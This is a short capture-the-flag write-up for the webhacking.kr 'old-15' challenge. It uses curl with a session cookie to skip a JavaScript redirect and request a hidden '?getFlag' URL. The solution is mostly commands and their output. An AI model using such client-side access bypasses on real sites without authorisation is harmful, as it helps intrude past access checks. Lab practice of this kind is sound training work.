# Old 15    JavaScript (Autoredirect)

URL: [https://webhacking.kr/challenge/js-2/](https://webhacking.kr/challenge/js-2/)

![old-15-1.png](/assets/ctf/webhacking.kr/old-15-1.png)

Seems like JavaScript is restricting access, we could disable JS in browser or just `curl`:
```bash
➜ curl 'https://webhacking.kr/challenge/js-2/' -b 'PHPSESSID=3052403292'
<html>
<head>
<title>Challenge 15</title>
</head>
<body>
<script>
  alert("Access_Denied");
  location.href='/';
  document.write("<a href=?getFlag>[Get Flag]</a>");
</script>
</body>
```

Add `?getFlag` and pwned.
```bash
➜ curl 'https://webhacking.kr/challenge/js-2/?getFlag' -b 'PHPSESSID=3052403292'
<script>alert('old-15 Pwned!');</script><hr>old-15 Pwned. You got 5point. Congratz!<hr><html>
<head>
<title>Challenge 15</title>
</head>
<body>
<script>
  alert("Access_Denied");
  location.href='/';
  document.write("<a href=?getFlag>[Get Flag]</a>");
</script>
</body>
```
